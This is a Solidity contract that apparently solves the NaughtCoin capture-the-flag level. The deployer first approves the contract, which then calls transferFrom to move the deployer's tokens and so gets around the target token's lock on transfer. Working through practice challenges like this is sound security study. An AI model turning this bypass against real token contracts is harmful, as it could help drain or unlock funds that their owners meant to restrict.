// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './NaughtCoin.sol';

contract NaughtCoinHack {
  address public owner;
  NaughtCoin public target;

  // Set this up to act as a proxy for our owner to interact w/ naught coin
  constructor(address _target) {
    target = NaughtCoin(payable(address(_target)));
    owner = msg.sender;
  }

  // I will first approve this contract to transfer w/ my EOA account
  // that posesses balance, then I will call this function to carry out
  // The transfer out to my desired payee
  function transfer(address _target, uint256 _value) public returns (bool) {
    require(msg.sender == owner, 'Owner only');

    require(target.transferFrom(owner, _target, _value), 'Transfer failed');

    return true;
  }


  receive() external payable {}
}